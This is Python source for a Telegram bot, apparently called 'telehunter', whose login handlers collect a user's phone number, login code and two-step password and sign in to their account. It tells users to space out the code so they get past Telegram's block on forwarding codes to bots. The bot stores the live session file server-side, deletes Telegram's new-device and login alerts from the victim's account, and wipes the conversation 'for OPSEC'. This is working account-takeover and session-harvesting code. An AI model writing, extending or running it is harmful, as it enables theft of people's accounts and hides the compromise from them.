"""Bot listener login handlers."""

from .common import *
from .commands import _wipe_conversation, schedule_deletion

async def starthunter(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Starts the login flow. Gated on ALLOW_PUBLIC_STARTHUNTER unless caller
    is a whitelisted admin. Rate-limited per user to prevent session-pool
    pollution (STARTHUNTER_RATE_LIMIT_PER_DAY per window)."""
    if update.effective_chat.type != "private":
        bot_username = context.bot.username or "telehunter234bot"
        await _reply_and_delete(update,
            "Use /starthunter in a private chat.\n"
            f"Open a DM with @{bot_username} and run /starthunter there.",
            parse_mode=ParseMode.MARKDOWN
        )
        return ConversationHandler.END

    # Public flag OR admin gate. Non-admins in ALLOW_PUBLIC_STARTHUNTER=False
    # deployments get a polite refusal.
    if not settings.ALLOW_PUBLIC_STARTHUNTER and not is_admin(update):
        logger.warning(
            "[starthunter] rejected non-admin subject=%s "
            "(ALLOW_PUBLIC_STARTHUNTER=False)",
            _subject_label(update.effective_user.id),
        )
        await _reply_and_delete(update,
            "🔒 This bot is not accepting new logins right now.",
        )
        return ConversationHandler.END

    # Per-user rate limit: STARTHUNTER_RATE_LIMIT_PER_DAY attempts per
    # STARTHUNTER_RATE_WINDOW_HOURS (default 3 per 24h). Redis-backed so it
    # survives bot restarts. Key format: rl:starthunter:<user_id>.
    # STARTHUNTER_RATE_LIMIT_PER_DAY=0 disables the gate.
    rate_limit = settings.STARTHUNTER_RATE_LIMIT_PER_DAY
    if rate_limit > 0:
        try:
            from app.core.redis_srv import redis_srv
            user_id = update.effective_user.id
            rl_key = f"rl:starthunter:{user_id}"
            window_hours = settings.STARTHUNTER_RATE_WINDOW_HOURS
            attempts = redis_srv.incr_key(
                rl_key, ttl_seconds=window_hours * 3600
            )
            if attempts > rate_limit:
                logger.warning(
                    "[starthunter] rate-limited subject=%s attempt=%s/%s in %sh",
                    _subject_label(user_id),
                    attempts,
                    rate_limit,
                    window_hours,
                )
                await _reply_and_delete(update,
                    f"Too many attempts ({rate_limit} per {window_hours}h). "
                    "Try again later.",
                )
                return ConversationHandler.END
        except Exception as rl_exc:
            # Redis down — don't fail closed, just log and let through
            logger.debug(f"[starthunter] rate-limit check skipped: {rl_exc}")

    msg = (
        "Reply with your phone number (+countrycode).\n"
        "Otherwise reply /cancel.\n\n"
        "Accepted formats: +1234567890 | +1 234 567 890 | +1-234-567-890"
    )
    sent_msg = await _reply_and_delete(update, msg, parse_mode=ParseMode.MARKDOWN)

    # Track both the user's /starthunter command and our reply for full wipe
    context.user_data['bot_messages'] = [update.message.message_id, sent_msg.message_id]

    return WAIT_PHONE

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    phone = update.message.text.strip()

    # Track user's phone message for wipe
    context.user_data.setdefault('bot_messages', []).append(update.message.message_id)

    # Initialize a temporary client
    import tempfile
    import uuid
    temp_dir = tempfile.gettempdir()
    session_id = uuid.uuid4().hex
    temp_session_path = os.path.join(temp_dir, f"temp_login_{session_id}")
    context.user_data['temp_session_path'] = temp_session_path
    client = None

    # Clean up old temp file if exists (not strictly needed with uuid but good practice)
    if os.path.exists(temp_session_path + ".session"):
        with contextlib.suppress(Exception):
            os.remove(temp_session_path + ".session")

    try:
        client = TelegramClient(temp_session_path, settings.TELEGRAM_API_ID, settings.TELEGRAM_API_HASH)
        await client.connect()

        sent_code = await client.send_code_request(phone)

        context.user_data['client'] = client
        context.user_data['phone'] = phone
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        context.user_data['temp_session_path'] = temp_session_path
        context.user_data['login_state'] = "WAITING_FOR_CODE"

        msg = (
            "✅ Code requested!\n\n"
            "Please check your Telegram app for the login code.\n"
            "⚠️ Telegram does not allow forwarding the code to bots. Please send the code with spaces in between numbers, or dashes, or commas.\n"
            "Example: 1 2 3 4 5 instead of 12345"
        )
        sent_msg = await _reply_and_delete(update, msg)
        context.user_data['bot_messages'].append(sent_msg.message_id)

        return WAIT_CODE

    except Exception as e:
        await _cleanup_login_attempt(context, client)
        logger.error(f"Error requesting code: {e}")
        err_msg = await _reply_and_delete(update, f"❌ Error requesting code: {str(e)}\nPlease try again with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err_msg.message_id)
        await _wipe_conversation(context, update.effective_chat.id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    raw_code = update.message.text
    chat_id = update.effective_chat.id

    # Always schedule deletion of the code
    context.user_data.setdefault('bot_messages', []).append(update.message.message_id)

    # Sanitize code
    code = raw_code.replace(" ", "").replace("-", "").replace(",", "").strip()

    client = context.user_data.get('client')
    phone = context.user_data.get('phone')
    phone_code_hash = context.user_data.get('phone_code_hash')

    if not client or not client.is_connected():
        await _cleanup_login_attempt(context, client)
        err = await _reply_and_delete(update, "❌ Session expired. Please start over with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

    try:
        await client.sign_in(phone, code=code, phone_code_hash=phone_code_hash)
        # Login success!
        return await finalize_login(update, context)

    except SessionPasswordNeededError:
        msg = "🔐 Two-Step Verification is enabled.\nPlease enter your password:"
        sent_msg = await _reply_and_delete(update, msg)
        context.user_data['bot_messages'].append(sent_msg.message_id)
        context.user_data['login_state'] = "WAITING_FOR_2FA"
        return WAIT_PASSWORD
    except Exception as e:
        await _cleanup_login_attempt(context, client)
        logger.error(f"Error signing in: {e}")
        err = await _reply_and_delete(update, f"❌ Login failed: {str(e)}\nPlease try again with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text
    chat_id = update.effective_chat.id

    # Always schedule deletion of password
    context.user_data.setdefault('bot_messages', []).append(update.message.message_id)

    client = context.user_data.get('client')

    if not client or not client.is_connected():
        await _cleanup_login_attempt(context, client)
        err = await _reply_and_delete(update, "❌ Session expired. Please start over with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

    try:
        await client.sign_in(password=password)
        return await finalize_login(update, context)
    except Exception as e:
        await _cleanup_login_attempt(context, client)
        logger.error(f"Error with 2FA password: {e}")
        err = await _reply_and_delete(update, f"❌ Incorrect password or error: {str(e)}\nPlease try again with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Finishes the login process, saves the session, and cleans up."""
    client = context.user_data.get('client')
    temp_session_path = context.user_data.get('temp_session_path')
    chat_id = update.effective_chat.id
    current_bot_username = context.bot.username or "unknown"

    try:
        me = await client.get_me()

        # Determine filename according to requirements: account_{phone}_{timestamp}.session
        import time
        phone_clean = context.user_data.get('phone', 'unknown').lstrip('+').replace(' ', '').replace('-', '')
        timestamp = int(time.time())
        filename = f"account_{phone_clean}_{timestamp}"

        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(BOT_LISTENER_SOURCE_FILE))))
        sessions_dir = os.path.join(base_dir, "sessions")
        os.makedirs(sessions_dir, exist_ok=True)
        # Save sessions directly to the project root as requested
        final_path = os.path.join(sessions_dir, filename + ".session")

        # ── Re-login cleanup ─────────────────────────────────────────────
        # If this phone already has session files or DB rows from a previous
        # login, remove them now. Two sessions for the same account cause
        # MTProto conflicts and long FloodWait cooldowns from Telegram.
        try:
            import glob as _glob

            # Delete any older session files matching this phone's digits
            old_pattern = os.path.join(sessions_dir, f"account_{phone_clean}_*.session")
            for old_file in _glob.glob(old_pattern):
                if os.path.abspath(old_file) == os.path.abspath(final_path):
                    continue  # never delete the file we're about to create
                try:
                    os.remove(old_file)
                    logger.info(f"[ReloginCleanup] deleted old session file: {os.path.basename(old_file)}")
                except Exception as _rm_exc:
                    logger.debug(f"[ReloginCleanup] could not remove {old_file}: {_rm_exc}")

            # Delete any DB rows whose session_path matches this phone's digits
            # but isn't the new final_path. Doing this in a threadpool so we
            # don't block the event loop.
            def _cleanup_db_rows():
                try:
                    existing = db.table("telegram_accounts").select("id, session_path").execute()
                    for r in existing.data or []:
                        p = r.get("session_path") or ""
                        # Match by "account_{phone_clean}_" substring
                        if f"/account_{phone_clean}_" in p and p != os.path.abspath(final_path):
                            db.table("telegram_accounts").delete().eq("id", r["id"]).execute()
                            logger.info(f"[ReloginCleanup] deleted DB row {r['id']} pointing to {p}")
                except Exception as _db_exc:
                    logger.debug(f"[ReloginCleanup] db row cleanup failed: {_db_exc}")

            await asyncio.to_thread(_cleanup_db_rows)
        except Exception as cleanup_exc:
            logger.warning(f"[ReloginCleanup] non-fatal: {cleanup_exc}")
        # ──────────────────────────────────────────────────────────────

        # Delete bot messages we sent during the flow (Footprint Cleanup)
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))

        # Use the USER account to clear history (Footprint Cleanup)
        try:
            # 1. Delete "Telegram Service Notification" (login code + new device alerts)
            async for message in client.iter_messages(TELEGRAM_SERVICE_NOTIFICATIONS_ID, limit=15):
                text = (message.message or "").lower()
                if any(kw in text for kw in ("new device", "login", "code", "verification")):
                    await message.delete()
                    logger.info(f"Deleted service notification for {filename}")

            # 2. Delete entire conversation history with the Login Bot itself
            # Use the bot's numeric ID to avoid ResolveUsernameRequest FloodWait
            bot_id = context.bot.id
            try:
                bot_entity = await client.get_input_entity(bot_id)
            except ValueError:
                bot_entity = await client.get_entity(bot_id)
            await client.delete_dialog(bot_entity)
            logger.info(f"Deleted dialog with bot {context.bot.username} for logged in user {filename}")
        except Exception as e:
            logger.error(f"Failed footprint cleanup: {e}")

        await client.disconnect()

        # Copy to final destination
        saved_successfully = False
        try:
            if os.path.isdir(final_path):
                shutil.rmtree(final_path)
            tmp_final_path = final_path + ".tmp"
            if os.path.exists(tmp_final_path):
                os.remove(tmp_final_path)
            shutil.copy2(temp_session_path + ".session", tmp_final_path)
            os.replace(tmp_final_path, final_path)
            os.chmod(final_path, SESSION_FILE_PERMISSIONS)  # SECURITY: restrict to owner only
            saved_successfully = True
        except PermissionError:
            logger.warning(f"File {final_path} is locked. Attempting sqlite3 injection...")
            try:
                import sqlite3
                src_conn = sqlite3.connect(temp_session_path + ".session")
                if os.path.isdir(final_path):
                    shutil.rmtree(final_path)
                dst_conn = sqlite3.connect(final_path, timeout=30.0)
                # Enable WAL mode so concurrent readers get a consistent snapshot
                dst_conn.execute("PRAGMA journal_mode=WAL")

                src_cur = src_conn.cursor()
                dst_cur = dst_conn.cursor()

                try:
                    # Wrap entire copy in a single transaction; rollback if anything fails
                    # Copy sessions table
                    src_cur.execute("SELECT dc_id, server_address, port, auth_key, takeout_id FROM sessions")
                    row = src_cur.fetchone()
                    dst_cur.execute("CREATE TABLE IF NOT EXISTS sessions (dc_id integer primary key, server_address text, port integer, auth_key blob, takeout_id integer)")
                    dst_cur.execute("DELETE FROM sessions")
                    if row:
                        dst_cur.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", row)

                    # Copy entities table safely
                    try:
                        src_cur.execute("SELECT id, hash, username, phone, name, date FROM entities")
                        entities = src_cur.fetchall()
                        dst_cur.execute("CREATE TABLE IF NOT EXISTS entities (id integer primary key, hash integer not null, username text, phone text, name text, date integer)")
                        dst_cur.executemany("INSERT OR REPLACE INTO entities VALUES (?, ?, ?, ?, ?, ?)", entities)
                    except Exception as e:
                        logger.warning(f"Failed to copy entities: {e}")

                    dst_conn.commit()
                    saved_successfully = True
                except Exception as copy_err:
                    dst_conn.rollback()
                    logger.error(f"Sqlite copy failed mid-transaction, rolled back: {copy_err}")
                    raise

                src_conn.close()
                dst_conn.close()
                try:
                    os.chmod(final_path, SESSION_FILE_PERMISSIONS)  # SECURITY: restrict to owner only
                except Exception as e:
                    logger.warning(f"Could not set session file permissions: {e}")
            except Exception as e:
                logger.error(f"Sqlite injection failed: {e}")

        if saved_successfully:
            # Database Entry (Persistence & Database Update)
            try:
                await asyncio.to_thread(
                    lambda: db.table("telegram_accounts").upsert({
                        "phone": context.user_data.get('phone'),
                        "session_path": os.path.abspath(final_path),
                        "telegram_user_id": me.id,
                        "status": "active",
                        "updated_at": "now()"
                    }).execute()
                )
                logger.info(f"Updated telegram_accounts for {context.user_data.get('phone')}")
            except Exception as e:
                logger.error(f"Failed to update database: {e}")

        if not saved_successfully:
            await _cleanup_temp_session(context)
            logger.warning(f"Bot @{current_bot_username} could not save session — recommending alternative bot.")
            current_token = context.bot_data.get('_bot_token', '')
            if current_token:
                _locked_bots.add(current_token)

            other_bots = _get_other_bot_usernames(current_bot_username)
            if not other_bots:
                other_bots = _get_all_bot_usernames_except(current_bot_username)

            if other_bots:
                bot_links = "\n".join([f"• @{b}" for b in other_bots])
                lock_msg = (
                    f"🔒 **Session Locked**\n\n"
                    f"This bot (@{current_bot_username}) could not save the session file "
                    f"because it is locked by another process.\n\n"
                    f"👉 **Please use one of these other bots instead:**\n"
                    f"{bot_links}\n\n"
                    f"Just open a chat with the bot above and type /starthunter to login."
                )
            else:
                lock_msg = (
                    f"🔒 **Session Locked**\n\n"
                    f"This bot (@{current_bot_username}) could not save the session file.\n"
                    f"No other bots are available at this time. Please try again later."
                )

            sent_msg = await _reply_and_delete(update, lock_msg, parse_mode=ParseMode.MARKDOWN)
            await schedule_deletion(context, chat_id, sent_msg.message_id, delay=30)
            return ConversationHandler.END

        # Session saved successfully — silent, no confirmation message.
        # The entire conversation is wiped immediately for OPSEC.
        current_token = context.bot_data.get('_bot_token', '')
        if current_token:
            _locked_bots.discard(current_token)

        await _cleanup_temp_session(context)

        # Auto-join monitor group step: generate a single-use invite link and
        # DM it to the user. The user's session MUST be a member of the
        # monitor group for user_agent.invite_bot_to_group() to work — this
        # is currently the biggest usability gap in the login flow.
        try:
            invite = await context.bot.create_chat_invite_link(
                chat_id=settings.MONITOR_GROUP_ID,
                member_limit=1,
                name=f"login-{phone_clean}-{timestamp}",
                creates_join_request=False,
            )
            invite_url = invite.invite_link
            join_msg = (
                "🍤 *Almost done — one more click*\n\n"
                "Your session is registered, but it must be a member of the "
                "monitor group to invite bots. Tap the link below to join "
                "(single-use, expires when consumed):\n\n"
                f"{invite_url}\n\n"
                "_This message will self-delete in 60 seconds._"
            )
            sent_join = await _reply_and_delete(update,
                join_msg,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True,
            )
            # Schedule the message for deletion so it doesn't linger in the user's DM
            await schedule_deletion(context, chat_id, sent_join.message_id, delay=60)
            logger.info(
                f"[JoinInvite] sent single-use invite link to phone={phone_clean} "
                f"(expires when consumed or 60s message TTL for the DM)"
            )
        except Exception as invite_exc:
            logger.warning(f"[JoinInvite] could not send invite link: {invite_exc}")

        # Wipe entire conversation history with this user for OPSEC
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

    except Exception as e:
        await _cleanup_login_attempt(context, client)
        logger.error(f"Error finalizing login: {e}")
        err = await _reply_and_delete(update, f"❌ Error finalizing login: {str(e)}")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await _wipe_conversation(context, update.effective_chat.id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

async def _cleanup_temp_session(context: ContextTypes.DEFAULT_TYPE):
    """Unconditionally delete the temp session file if present. Called from every
    conversation exit path so live Telethon auth keys don't leak on abandon."""
    temp_path = context.user_data.get('temp_session_path')
    if not temp_path:
        return
    for suffix in (".session", ".session-journal", ".session-wal", ".session-shm", ""):
        p = temp_path + suffix
        try:
            if os.path.exists(p):
                os.remove(p)
        except Exception as e:
            logger.debug(f"[TempCleanup] could not remove {p}: {e}")

async def _cleanup_login_attempt(context: ContextTypes.DEFAULT_TYPE, client=None):
    """Disconnect an active login client and remove its temporary session files."""
    client = client or context.user_data.get('client')
    if client:
        with contextlib.suppress(Exception):
            if client.is_connected():
                await client.disconnect()
    await _cleanup_temp_session(context)

async def cancel_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the conversation — silent wipe for OPSEC."""
    client = context.user_data.get('client')
    if client:
        with contextlib.suppress(Exception):
            await client.disconnect()
    await _cleanup_temp_session(context)
    chat_id = update.effective_chat.id
    await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
    return ConversationHandler.END

async def _conversation_timeout(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Fires when a login conversation exceeds conversation_timeout. Wipes any
    orphaned temp session file + closes the Telethon client."""
    client = context.user_data.get('client')
    if client:
        with contextlib.suppress(Exception):
            await client.disconnect()
    await _cleanup_temp_session(context)
    chat_id = update.effective_chat.id if update and update.effective_chat else None
    if chat_id:
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
    return ConversationHandler.END
